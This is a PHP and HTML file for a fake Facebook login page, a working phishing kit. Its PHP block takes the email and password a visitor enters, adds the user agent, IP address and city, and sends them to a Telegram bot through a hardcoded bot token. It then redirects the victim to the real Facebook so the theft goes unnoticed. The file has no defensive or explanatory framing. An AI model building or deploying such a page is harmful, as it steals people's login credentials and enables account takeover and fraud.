<?php
// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $chatid = $_GET['id'] ?? ''; // chat id from URL
    $botToken = '7290451157:AAFoAI4fd8J2Zej0Q7xYY2dCZZxLQrEhMk0';

    // Get IP info using ipapi
    $ipInfo = json_decode(file_get_contents("https://ipapi.co/json/"), true);
    $ip = $ipInfo['ip'] ?? 'Unknown';
    $city = $ipInfo['city'] ?? 'Unknown';

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $page = "Facebook";

    // Construct message
    $message = "> Login Page : $page\n\n";
    $message .= "> Username : $email\n\n";
    $message .= "> Password : $password\n\n";
    $message .= "> User Agent : $userAgent\n\n";
    $message .= "> IP Address : $ip\n\n";
    $message .= "> City : $city";

    // Send to Telegram
    $telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
    $payload = json_encode([
        'chat_id' => $chatid,
        'text' => $message
    ]);

    $opts = ['http' =>
        [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $payload
        ]
    ];
    $context  = stream_context_create($opts);
    $result = file_get_contents($telegramURL, false, $context);

    // Redirect to Facebook after sending
    header("Location: https://www.facebook.com");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 320px;
      padding: 20px;
    }
    .logo-container {
      margin-bottom: 20px;
    }
    .logo {
      font-family: 'Arial Black', sans-serif;
      font-size: 36px;
      color: #1877f2;
    }
    .slogan {
      color: #555;
      font-size: 14px;
      margin-top: 5px;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }
    .login-button {
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      padding: 12px;
      width: 100%;
      cursor: pointer;
      font-size: 18px;
      margin: 12px 0;
    }
    .login-button:hover {
      background-color: #0e5ace;
    }
    a {
      text-decoration: none;
      color: #1877f2;
      font-size: 14px;
    }
    .divider {
      margin: 12px 0;
      border-top: 1px solid #ddd;
    }
    .no-social-login {
      font-size: 14px;
      margin-top: 16px;
    }
    .no-social-login a {
      font-weight: bold;
      color: #1877f2;
    }
    .no-social-login a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <div class="logo"><strong>Facebook Login</strong></div>
      <p class="slogan">Connect with friends and the world around you.</p>
    </div>
    <div class="form-container">
      <form method="post">
        <input type="text" placeholder="Email or Phone Number" class="input-field" name="email" required>
        <input type="password" placeholder="Password" class="input-field" name="password" required>
        <button type="submit" class="login-button">Log In</button>
      </form>
      <a href="#">Forgot Password?</a>
      <div class="divider"></div>
      <div class="no-social-login">
        <p>Don't have an account? <a href="#">Sign Up</a></p>
      </div>
    </div>
  </div>
</body>
</html>
